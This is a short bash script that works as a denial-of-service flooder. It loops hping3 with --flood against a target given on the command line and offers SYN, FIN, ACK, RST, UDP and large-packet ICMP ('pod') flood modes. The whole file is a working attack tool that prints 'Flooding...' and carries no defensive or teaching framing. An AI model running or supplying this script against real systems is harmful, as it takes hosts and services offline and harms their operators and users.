#!/bin/bash

echo "Hitting : $1"
echo "With Size : $2"
echo
echo "Flooding..."
echo

if [ "$3" == "syn" ]; then
    while true; do
        hping3 -S "$1" -d "$2" -p 3000 --flood
        # sleep 0.5
    done
else if [ "$3" == "pod" ]; then
    while true; do
        hping3 -1 $1 --flood --icmp -d 60000
        # sleep 0.5
    done 
else if [ "$3" == "fin" ]; then
    while true; do
        hping3 -F "$1" -d "$2" --flood
        # sleep 0.5
    done
else if [ "$3" == "ack" ]; then
    while true; do
        hping3 -A "$1" -d "$2" --flood
        # sleep 0.5
    done
else if [ "$3" == "rst" ]; then
    while true; do
        hping3 -R "$1" -d "$2" --flood
        # sleep 0.5
    done
else if [ "$3" == "udp" ]; then
    while true; do
        hping3 -2 "$1" -d "$2" --flood
        # sleep 0.5
    done
else
    echo "Invalid Protocol"

fi
fi
fi
fi
fi
fi